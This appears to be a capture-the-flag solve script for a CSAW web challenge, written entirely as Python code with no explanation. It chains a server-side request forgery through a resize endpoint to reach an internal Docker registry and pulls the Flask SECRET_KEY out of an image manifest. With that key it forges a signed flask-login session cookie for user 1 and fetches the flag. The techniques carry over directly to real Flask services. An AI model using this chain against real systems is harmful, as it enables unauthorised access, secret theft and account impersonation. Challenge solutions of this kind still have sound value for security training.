import requests

print(requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io.2.as65535.net:9000/v2/_catalog'}).text)

asdf = requests.get('http://red.chal.csaw.io:8268/resize', params={'url': 'http://red.chal.csaw.io.2.as65535.net:9000/v2/resizer/manifests/latest'}).text
secret = asdf.split('SECRET_KEY=')[1].split(' ')[0]
print(f"got flask secret {secret}")

from flask import Flask, session
app = Flask(__name__)
app.secret_key = secret

@app.route('/')
def asdf():
    # This is what flask-login actually cares about
    # https://github.com/maxcountryman/flask-login/blob/3eb30a2ceb507a5e1e171844f213d799d1158e73/flask_login/login_manager.py#L328)
    session['_user_id'] = 1
    return ''


flask_test_client = app.test_client()
r = flask_test_client.get('/')
cookie = r.headers['Set-Cookie'].split('session=')[1].split(';')[0]

print(f'signed cookie {cookie}')

asdf = requests.get('http://red.chal.csaw.io:8268/', cookies={'session': cookie})
flag = asdf.text.split('flag{')[1].split('}')[0]
print(f"flag{{{flag}}}")
